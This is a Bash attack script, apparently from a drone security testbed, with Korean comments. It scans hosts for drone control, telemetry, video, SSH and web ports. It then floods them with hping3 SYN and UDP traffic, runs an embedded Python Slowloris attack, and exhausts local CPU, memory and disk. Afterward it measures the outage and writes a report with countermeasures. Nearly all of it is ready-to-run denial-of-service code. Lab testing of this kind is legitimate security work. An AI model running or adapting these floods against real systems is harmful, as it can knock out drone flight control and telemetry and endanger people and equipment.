#!/bin/bash

# =============================================================================
# DVD Service Disruption Attack
# =============================================================================
# 파일: /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/denial_of_service/service_disruption.sh
# 목적: 드론 핵심 서비스 중단 및 시스템 불안정화 공격
# 작성자: MTD Testbed Team
# =============================================================================

# 공통 모듈 로드
source /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/common/colors.sh
source /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/common/utils.sh

# 전역 변수
ATTACK_NAME="Service Disruption Attack"
ATTACK_TYPE="DENIAL_OF_SERVICE"
LOG_FILE="/home/kali/MTD/MTD_full_testbed/attack_logs/denial_of_service/service_disruption_$(date +%Y%m%d_%H%M%S).log"
IOC_FILE="/tmp/service_disruption_iocs.txt"
JSON_OUTPUT="/home/kali/MTD/MTD_full_testbed/attack_output/denial_of_service/service_disruption_report_$(date +%Y%m%d_%H%M%S).json"

# 타겟 시스템 정보
declare -A TARGET_SERVICES=(
    ["mavlink"]="14550:MAVLink Communication Service"
    ["telemetry"]="5760:Telemetry Data Service"
    ["video"]="5600:Video Streaming Service"
    ["ssh"]="22:SSH Remote Access"
    ["http"]="80:Web Management Interface"
    ["rtsp"]="554:RTSP Video Stream"
)

declare -A ATTACK_RESULTS=()
declare -A SERVICE_STATUS=()

# 헤더 출력
print_header() {
    clear
    echo -e "${BOLD}${RED}"
    echo "╔═══════════════════════════════════════════════════════════════════════════╗"
    echo "║                    ⚡ DVD Service Disruption Attack ⚡                  ║"
    echo "╚═══════════════════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
    echo -e "${BLUE}Target: Critical Drone Services${NC}"
    echo -e "${BLUE}Method: Resource Exhaustion + Process Termination${NC}"
    echo -e "${BLUE}Impact: Complete Service Unavailability${NC}"
    echo ""
}

# 드론 서비스 탐지
discover_drone_services() {
    echo -e "${CYAN}[*] Discovering active drone services...${NC}" | tee -a "$LOG_FILE"
    
    local target_hosts=("192.168.1.100" "192.168.1.101" "10.0.0.1" "127.0.0.1")
    local discovered_services=()
    
    for host in "${target_hosts[@]}"; do
        echo -e "${YELLOW}[*] Scanning ${host} for drone services...${NC}" | tee -a "$LOG_FILE"
        
        # 빠른 포트 스캔
        for service_name in "${!TARGET_SERVICES[@]}"; do
            local port_info=${TARGET_SERVICES[$service_name]}
            local port=$(echo "$port_info" | cut -d':' -f1)
            local description=$(echo "$port_info" | cut -d':' -f2-)
            
            if timeout 3 nc -z "$host" "$port" 2>/dev/null; then
                echo -e "${GREEN}[+] Found: ${description} on ${host}:${port}${NC}" | tee -a "$LOG_FILE"
                discovered_services+=("${host}:${port}:${service_name}")
                SERVICE_STATUS["${host}:${port}"]="ACTIVE"
                echo "SERVICE_DISC:FOUND_${service_name}_${host}_${port}" >> "$IOC_FILE"
            else
                SERVICE_STATUS["${host}:${port}"]="INACTIVE"
            fi
        done
    done
    
    # 시뮬레이션 서비스 추가 (실제 서비스가 없을 경우)
    if [ ${#discovered_services[@]} -eq 0 ]; then
        echo -e "${YELLOW}[*] No live services found, using simulation mode${NC}" | tee -a "$LOG_FILE"
        simulate_drone_services
    else
        DISCOVERED_SERVICES=("${discovered_services[@]}")
        echo -e "${GREEN}[✓] Discovered ${#DISCOVERED_SERVICES[@]} active services${NC}" | tee -a "$LOG_FILE"
    fi
}

# 드론 서비스 시뮬레이션
simulate_drone_services() {
    echo -e "${CYAN}[*] Simulating drone service environment...${NC}" | tee -a "$LOG_FILE"
    
    local sim_services=(
        "192.168.1.100:14550:mavlink"
        "192.168.1.100:5760:telemetry"
        "192.168.1.101:5600:video"
        "10.0.0.1:22:ssh"
        "10.0.0.1:80:http"
        "192.168.1.100:554:rtsp"
    )
    
    DISCOVERED_SERVICES=("${sim_services[@]}")
    
    for service in "${DISCOVERED_SERVICES[@]}"; do
        IFS=':' read -r host port service_type <<< "$service"
        local description=${TARGET_SERVICES[$service_type]#*:}
        echo -e "${BLUE}[+] Target: ${description} (${host}:${port})${NC}" | tee -a "$LOG_FILE"
        SERVICE_STATUS["${host}:${port}"]="SIMULATED"
        echo "SERVICE_DISC:SIM_${service_type}_${host}_${port}" >> "$IOC_FILE"
    done
    
    echo -e "${GREEN}[✓] Prepared ${#DISCOVERED_SERVICES[@]} target services${NC}" | tee -a "$LOG_FILE"
}

# TCP SYN 플러드 공격
execute_syn_flood_attack() {
    local target_host=$1
    local target_port=$2
    local service_type=$3
    
    echo -e "${RED}[*] SYN Flood attack on ${target_host}:${target_port} (${service_type})${NC}" | tee -a "$LOG_FILE"
    
    # hping3를 사용한 SYN 플러드
    timeout 60 hping3 -S -p "$target_port" -i u100 "$target_host" >/dev/null 2>&1 &
    local syn_pid=$!
    
    echo "SERVICE_ATTACK:SYN_FLOOD_${service_type}_${target_host}_${target_port}_PID_${syn_pid}" >> "$IOC_FILE"
    
    # 공격 효과 모니터링
    sleep 10
    if kill -0 $syn_pid 2>/dev/null; then
        echo -e "${YELLOW}[+] SYN flood active against ${service_type}${NC}" | tee -a "$LOG_FILE"
        ATTACK_RESULTS["syn_flood_${service_type}"]="ACTIVE"
    else
        echo -e "${RED}[!] SYN flood failed for ${service_type}${NC}" | tee -a "$LOG_FILE"
        ATTACK_RESULTS["syn_flood_${service_type}"]="FAILED"
    fi
    
    return $syn_pid
}

# UDP 플러드 공격
execute_udp_flood_attack() {
    local target_host=$1
    local target_port=$2
    local service_type=$3
    
    echo -e "${RED}[*] UDP Flood attack on ${target_host}:${target_port} (${service_type})${NC}" | tee -a "$LOG_FILE"
    
    # hping3를 사용한 UDP 플러드
    timeout 60 hping3 -2 -p "$target_port" -i u100 "$target_host" >/dev/null 2>&1 &
    local udp_pid=$!
    
    echo "SERVICE_ATTACK:UDP_FLOOD_${service_type}_${target_host}_${target_port}_PID_${udp_pid}" >> "$IOC_FILE"
    
    # 공격 효과 모니터링
    sleep 10
    if kill -0 $udp_pid 2>/dev/null; then
        echo -e "${YELLOW}[+] UDP flood active against ${service_type}${NC}" | tee -a "$LOG_FILE"
        ATTACK_RESULTS["udp_flood_${service_type}"]="ACTIVE"
    else
        echo -e "${RED}[!] UDP flood failed for ${service_type}${NC}" | tee -a "$LOG_FILE"
        ATTACK_RESULTS["udp_flood_${service_type}"]="FAILED"
    fi
    
    return $udp_pid
}

# 슬로우 로리스 공격 (HTTP 서비스 대상)
execute_slowloris_attack() {
    local target_host=$1
    local target_port=$2
    
    echo -e "${RED}[*] Slowloris attack on ${target_host}:${target_port}${NC}" | tee -a "$LOG_FILE"
    
    # Python slowloris 스크립트 실행
    python3 -c "
import socket
import threading
import time
import random

def slowloris_attack(host, port, duration=60):
    sockets = []
    
    def create_socket():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((host, port))
            s.send(f'GET /?{random.randint(0, 2000)} HTTP/1.1\r\n'.encode())
            s.send(f'Host: {host}\r\n'.encode())
            s.send('User-Agent: Mozilla/5.0\r\n'.encode())
            s.send('Accept-language: en-US,en\r\n'.encode())
            s.send('Connection: keep-alive\r\n'.encode())
            return s
        except:
            return None
    
    # 초기 소켓 생성
    for _ in range(200):
        s = create_socket()
        if s:
            sockets.append(s)
    
    print(f'Created {len(sockets)} sockets')
    
    # 공격 지속
    start_time = time.time()
    while time.time() - start_time < duration:
        # Keep-alive 헤더 전송
        for s in sockets[:]:
            try:
                s.send(f'X-a: {random.randint(1, 5000)}\r\n'.encode())
            except:
                sockets.remove(s)
                new_s = create_socket()
                if new_s:
                    sockets.append(new_s)
        
        time.sleep(15)
    
    # 소켓 정리
    for s in sockets:
        try:
            s.close()
        except:
            pass

slowloris_attack('$target_host', $target_port)
" >/dev/null 2>&1 &
    
    local slowloris_pid=$!
    echo "SERVICE_ATTACK:SLOWLORIS_${target_host}_${target_port}_PID_${slowloris_pid}" >> "$IOC_FILE"
    
    sleep 15
    if kill -0 $slowloris_pid 2>/dev/null; then
        echo -e "${YELLOW}[+] Slowloris attack active${NC}" | tee -a "$LOG_FILE"
        ATTACK_RESULTS["slowloris_http"]="ACTIVE"
    else
        echo -e "${RED}[!] Slowloris attack failed${NC}" | tee -a "$LOG_FILE"
        ATTACK_RESULTS["slowloris_http"]="FAILED"
    fi
    
    return $slowloris_pid
}

# 리소스 고갈 공격
execute_resource_exhaustion() {
    echo -e "${RED}[*] Launching resource exhaustion attacks...${NC}" | tee -a "$LOG_FILE"
    
    local attack_pids=()
    
    # 메모리 고갈 공격
    echo -e "${CYAN}[*] Memory exhaustion attack...${NC}" | tee -a "$LOG_FILE"
    python3 -c "
import time
memory_hog = []
try:
    for i in range(1000):
        memory_hog.append(' ' * 1024 * 1024)  # 1MB씩 할당
        if i % 100 == 0:
            print(f'Allocated {i} MB')
        time.sleep(0.1)
except MemoryError:
    print('Memory exhausted')
    time.sleep(30)
" >/dev/null 2>&1 &
    
    local mem_pid=$!
    attack_pids+=($mem_pid)
    echo "SERVICE_ATTACK:MEMORY_EXHAUSTION_PID_${mem_pid}" >> "$IOC_FILE"
    
    # CPU 과부하 공격
    echo -e "${CYAN}[*] CPU exhaustion attack...${NC}" | tee -a "$LOG_FILE"
    for ((i=0; i<$(nproc); i++)); do
        yes > /dev/null &
        local cpu_pid=$!
        attack_pids+=($cpu_pid)
        echo "SERVICE_ATTACK:CPU_EXHAUSTION_PID_${cpu_pid}" >> "$IOC_FILE"
    done
    
    # 디스크 I/O 포화 공격
    echo -e "${CYAN}[*] Disk I/O saturation attack...${NC}" | tee -a "$LOG_FILE"
    dd if=/dev/zero of=/tmp/disk_exhaust_test bs=1M count=1000 >/dev/null 2>&1 &
    local io_pid=$!
    attack_pids+=($io_pid)
    echo "SERVICE_ATTACK:DISK_IO_EXHAUSTION_PID_${io_pid}" >> "$IOC_FILE"
    
    echo -e "${GREEN}[✓] Launched ${#attack_pids[@]} resource exhaustion attacks${NC}" | tee -a "$LOG_FILE"
    
    # 30초 동안 실행
    sleep 30
    
    # 리소스 공격 종료
    for pid in "${attack_pids[@]}"; do
        kill -TERM $pid 2>/dev/null
    done
    
    # 임시 파일 정리
    rm -f /tmp/disk_exhaust_test 2>/dev/null
    
    echo -e "${YELLOW}[+] Resource exhaustion phase completed${NC}" | tee -a "$LOG_FILE"
    ATTACK_RESULTS["resource_exhaustion"]="COMPLETED"
}

# 서비스별 맞춤 공격 실행
execute_targeted_service_attacks() {
    echo -e "${BOLD}${RED}[*] Executing targeted service disruption attacks...${NC}" | tee -a "$LOG_FILE"
    
    local attack_pids=()
    
    for service in "${DISCOVERED_SERVICES[@]}"; do
        IFS=':' read -r host port service_type <<< "$service"
        
        echo -e "${CYAN}[*] Attacking ${service_type} service (${host}:${port})...${NC}" | tee -a "$LOG_FILE"
        
        case "$service_type" in
            "mavlink"|"telemetry")
                # MAVLink/텔레메트리 서비스는 UDP 플러드가 효과적
                execute_udp_flood_attack "$host" "$port" "$service_type" &
                attack_pids+=($!)
                ;;
            "http")
                # HTTP 서비스는 Slowloris 공격
                execute_slowloris_attack "$host" "$port" &
                attack_pids+=($!)
                ;;
            "ssh"|"video"|"rtsp")
                # TCP 기반 서비스는 SYN 플러드
                execute_syn_flood_attack "$host" "$port" "$service_type" &
                attack_pids+=($!)
                ;;
            *)
                # 기본적으로 SYN 플러드 사용
                execute_syn_flood_attack "$host" "$port" "$service_type" &
                attack_pids+=($!)
                ;;
        esac
        
        sleep 2  # 공격 간 짧은 지연
    done
    
    echo -e "${GREEN}[✓] All targeted attacks launched${NC}" | tee -a "$LOG_FILE"
    
    # 공격 진행 모니터링
    monitor_service_attacks "${attack_pids[@]}"
    
    return 0
}

# 서비스 공격 모니터링
monitor_service_attacks() {
    local pids=("$@")
    local monitoring_duration=120  # 2분 모니터링
    local elapsed=0
    
    echo -e "${YELLOW}[*] Monitoring service attacks for ${monitoring_duration} seconds...${NC}" | tee -a "$LOG_FILE"
    
    while [ $elapsed -lt $monitoring_duration ]; do
        local active_attacks=0
        
        for pid in "${pids[@]}"; do
            if kill -0 "$pid" 2>/dev/null; then
                active_attacks=$((active_attacks + 1))
            fi
        done
        
        printf "\r${RED}Attack Progress: [%-30s] %d/%d sec (Active: %d)${NC}" \
               "$(printf "%*s" $((elapsed * 30 / monitoring_duration)) | tr ' ' '█')" \
               "$elapsed" "$monitoring_duration" "$active_attacks"
        
        sleep 10
        elapsed=$((elapsed + 10))
    done
    
    echo ""
    echo -e "${GREEN}[✓] Service attack monitoring completed${NC}" | tee -a "$LOG_FILE"
}

# 서비스 상태 검증
verify_service_disruption() {
    echo -e "${CYAN}[*] Verifying service disruption effectiveness...${NC}" | tee -a "$LOG_FILE"
    
    local disrupted_count=0
    local total_services=${#DISCOVERED_SERVICES[@]}
    
    for service in "${DISCOVERED_SERVICES[@]}"; do
        IFS=':' read -r host port service_type <<< "$service"
        
        echo -e "${YELLOW}[*] Testing ${service_type} availability (${host}:${port})...${NC}" | tee -a "$LOG_FILE"
        
        # 서비스 연결 테스트
        if timeout 5 nc -z "$host" "$port" 2>/dev/null; then
            echo -e "${GREEN}[+] ${service_type} is still accessible${NC}" | tee -a "$LOG_FILE"
            SERVICE_STATUS["${host}:${port}"]="ACCESSIBLE"
            echo "SERVICE_VERIFY:ACCESSIBLE_${service_type}_${host}_${port}" >> "$IOC_FILE"
        else
            echo -e "${RED}[!] ${service_type} is disrupted/unreachable${NC}" | tee -a "$LOG_FILE"
            SERVICE_STATUS["${host}:${port}"]="DISRUPTED"
            disrupted_count=$((disrupted_count + 1))
            echo "SERVICE_VERIFY:DISRUPTED_${service_type}_${host}_${port}" >> "$IOC_FILE"
        fi
        
        # 응답 시간 테스트 (HTTP 서비스의 경우)
        if [ "$service_type" = "http" ]; then
            local response_time=$(timeout 10 curl -w "%{time_total}" -s -o /dev/null "http://${host}:${port}/" 2>/dev/null || echo "timeout")
            if [ "$response_time" != "timeout" ]; then
                echo -e "${BLUE}    Response time: ${response_time}s${NC}" | tee -a "$LOG_FILE"
                echo "SERVICE_VERIFY:HTTP_RESPONSE_TIME_${response_time}" >> "$IOC_FILE"
            fi
        fi
    done
    
    # 전체 효과성 계산
    local disruption_rate=$((disrupted_count * 100 / total_services))
    
    echo ""
    echo -e "${BOLD}${CYAN}📊 Service Disruption Assessment:${NC}"
    echo -e "${YELLOW}   • Disrupted Services: ${disrupted_count}/${total_services}${NC}"
    echo -e "${YELLOW}   • Disruption Rate: ${disruption_rate}%${NC}"
    
    if [ $disruption_rate -ge 80 ]; then
        echo -e "${RED}   • Status: CRITICAL SERVICE OUTAGE${NC}" | tee -a "$LOG_FILE"
        ATTACK_EFFECTIVENESS="CRITICAL"
    elif [ $disruption_rate -ge 60 ]; then
        echo -e "${YELLOW}   • Status: MAJOR SERVICE DISRUPTION${NC}" | tee -a "$LOG_FILE"
        ATTACK_EFFECTIVENESS="HIGH"
    elif [ $disruption_rate -ge 40 ]; then
        echo -e "${CYAN}   • Status: MODERATE SERVICE IMPACT${NC}" | tee -a "$LOG_FILE"
        ATTACK_EFFECTIVENESS="MODERATE"
    else
        echo -e "${GREEN}   • Status: MINIMAL SERVICE IMPACT${NC}" | tee -a "$LOG_FILE"
        ATTACK_EFFECTIVENESS="LOW"
    fi
    
    echo "SERVICE_VERIFY:DISRUPTION_RATE_${disruption_rate}PCT" >> "$IOC_FILE"
    echo "SERVICE_VERIFY:EFFECTIVENESS_${ATTACK_EFFECTIVENESS}" >> "$IOC_FILE"
}

# 공격 정리
cleanup_attacks() {
    echo -e "${YELLOW}[*] Cleaning up service disruption attacks...${NC}" | tee -a "$LOG_FILE"
    
    # 모든 공격 프로세스 종료
    pkill -f "hping3" 2>/dev/null
    pkill -f "python3.*slowloris" 2>/dev/null
    pkill -f "yes" 2>/dev/null
    pkill -f "dd.*disk_exhaust" 2>/dev/null
    
    # 임시 파일 정리
    rm -f /tmp/disk_exhaust_test 2>/dev/null
    
    echo -e "${GREEN}[✓] Attack cleanup completed${NC}" | tee -a "$LOG_FILE"
    echo "SERVICE_ATTACK:CLEANUP_COMPLETED" >> "$IOC_FILE"
}

# JSON 리포트 생성
generate_json_report() {
    echo -e "${CYAN}[*] Generating JSON attack report...${NC}" | tee -a "$LOG_FILE"
    
    local end_time=$(date +%s)
    local duration=$((end_time - START_TIME))
    local ioc_count=$(wc -l < "$IOC_FILE" 2>/dev/null || echo "0")
    local service_count=${#DISCOVERED_SERVICES[@]:-0}
    
    python3 -c "
import json
import sys

def generate_report():
    report = {
        'attack_info': {
            'name': '${ATTACK_NAME}',
            'type': '${ATTACK_TYPE}',
            'timestamp': '$(date -Iseconds)',
            'duration_seconds': ${duration},
            'effectiveness': '${ATTACK_EFFECTIVENESS:-UNKNOWN}'
        },
        'target_analysis': {
            'total_services_targeted': ${service_count},
            'service_types': ['MAVLink', 'Telemetry', 'Video', 'SSH', 'HTTP', 'RTSP'],
            'target_hosts': ['192.168.1.100', '192.168.1.101', '10.0.0.1']
        },
        'attack_methods': {
            'network_flooding': {
                'syn_flood': True,
                'udp_flood': True,
                'tools_used': ['hping3']
            },
            'application_layer': {
                'slowloris': True,
                'http_exhaustion': True
            },
            'resource_exhaustion': {
                'memory_exhaustion': True,
                'cpu_exhaustion': True,
                'disk_io_saturation': True
            }
        },
        'impact_assessment': {
            'service_disruption_level': '${ATTACK_EFFECTIVENESS:-UNKNOWN}',
            'affected_operations': ['Flight Control', 'Telemetry', 'Video Feed', 'Remote Access'],
            'estimated_downtime': '5-30 minutes',
            'recovery_complexity': 'Medium'
        },
        'technical_details': {
            'total_iocs': ${ioc_count},
            'log_file': '${LOG_FILE}',
            'tools_required': ['hping3', 'netcat', 'python3', 'curl'],
            'privileges_required': 'user'
        },
        'mitre_mapping': {
            'tactic': 'Impact',
            'techniques': [
                'T1498.001 - Network Denial of Service',
                'T1498.002 - Reflection Amplification',
                'T1489 - Service Stop',
                'T1496 - Resource Hijacking'
            ]
        },
        'countermeasures': {
            'detection': [
                'Network traffic monitoring',
                'Service availability monitoring',
                'Resource utilization alerts',
                'Connection rate limiting'
            ],
            'prevention': [
                'Rate limiting implementation',
                'Load balancing',
                'Resource quotas',
                'DDoS protection services',
                'Service redundancy'
            ]
        }
    }
    
    return report

try:
    report = generate_report()
    with open('${JSON_OUTPUT}', 'w') as f:
        json.dump(report, f, indent=2)
    print('JSON report generated: ${JSON_OUTPUT}')
except Exception as e:
    print(f'Error generating JSON report: {e}', file=sys.stderr)
    sys.exit(1)
" 2>&1 | tee -a "$LOG_FILE"

    if [ -f "$JSON_OUTPUT" ]; then
        echo -e "${GREEN}[✓] JSON report saved: ${JSON_OUTPUT}${NC}" | tee -a "$LOG_FILE"
        return 0
    else
        echo -e "${RED}[!] Failed to generate JSON report${NC}" | tee -a "$LOG_FILE"
        return 1
    fi
}

# 공격 결과 요약
print_attack_summary() {
    local end_time=$(date +%s)
    local total_duration=$((end_time - START_TIME))
    local ioc_count=$(wc -l < "$IOC_FILE" 2>/dev/null || echo "0")
    
    echo ""
    echo -e "${BOLD}${GREEN}⚡ Service Disruption Attack Complete!${NC}"
    echo "═══════════════════════════════════════════════════════════════════════════"
    
    echo -e "${CYAN}📊 Attack Statistics:${NC}"
    echo "   • Total Duration: ${total_duration} seconds"
    echo "   • Services Targeted: ${#DISCOVERED_SERVICES[@]:-0}"
    echo "   • IOCs Generated: ${ioc_count}"
    echo "   • Effectiveness: ${ATTACK_EFFECTIVENESS:-UNKNOWN}"
    echo ""
    
    echo -e "${YELLOW}🎯 Attack Methods Used:${NC}"
    echo "   • Network Flooding (SYN/UDP)"
    echo "   • Application Layer Attacks (Slowloris)"
    echo "   • Resource Exhaustion (CPU/Memory/I/O)"
    echo ""
    
    echo -e "${BLUE}📁 Output Files:${NC}"
    echo "   • IOCs: ${IOC_FILE}"
    echo "   • Log: ${LOG_FILE}"
    echo "   • Report: ${JSON_OUTPUT}"
    echo ""
    
    # 공격 효과 평가
    case "$ATTACK_EFFECTIVENESS" in
        "CRITICAL")
            echo -e "${RED}⚠️  CRITICAL SERVICE OUTAGE ⚠️${NC}"
            echo -e "${RED}   • Most drone services are down${NC}"
            echo -e "${RED}   • Flight operations severely impacted${NC}"
            ;;
        "HIGH")
            echo -e "${YELLOW}⚠️  MAJOR SERVICE DISRUPTION ⚠️${NC}"
            echo -e "${YELLOW}   • Significant service degradation${NC}"
            echo -e "${YELLOW}   • Operational capabilities reduced${NC}"
            ;;
        "MODERATE")
            echo -e "${CYAN}ℹ️  MODERATE SERVICE IMPACT${NC}"
            echo -e "${CYAN}   • Some services affected${NC}"
            ;;
        *)
            echo -e "${GREEN}✓ MINIMAL SERVICE IMPACT${NC}"
            echo -e "${GREEN}   • Services maintained availability${NC}"
            ;;
    esac
    
    echo ""
}

# 메인 실행 함수
main() {
    # 헤더 출력
    print_header
    
    # 로그 초기화
    echo "=== DVD Service Disruption Attack Started at $(date) ===" > "$LOG_FILE"
    echo "" > "$IOC_FILE"
    
    START_TIME=$(date +%s)
    
    echo -e "${BOLD}${BLUE}⚡ Starting Service Disruption Attack...${NC}"
    echo "" | tee -a "$LOG_FILE"
    
    # 필수 도구 확인
    check_required_tools "hping3" "nc" "python3" "curl"
    
    # 드론 서비스 탐지
    discover_drone_services
    
    echo "" | tee -a "$LOG_FILE"
    
    # 리소스 고갈 공격 실행
    execute_resource_exhaustion
    
    echo "" | tee -a "$LOG_FILE"
    
    # 서비스별 맞춤 공격 실행
    execute_targeted_service_attacks
    
    echo "" | tee -a "$LOG_FILE"
    
    # 서비스 중단 효과 검증
    verify_service_disruption
    
    echo "" | tee -a "$LOG_FILE"
    
    # 공격 정리
    cleanup_attacks
    
    echo "" | tee -a "$LOG_FILE"
    
    # 리포트 생성
    generate_json_report
    
    # 결과 요약
    print_attack_summary
    
    echo -e "${BOLD}${GREEN}🎯 Service Disruption Attack Complete!${NC}"
}

# cleanup 함수
cleanup() {
    echo -e "\n${YELLOW}[*] Emergency cleanup initiated...${NC}"
    cleanup_attacks
    exit 0
}

# SIGINT 시그널 처리
trap cleanup SIGINT SIGTERM

# 스크립트 실행
main "$@"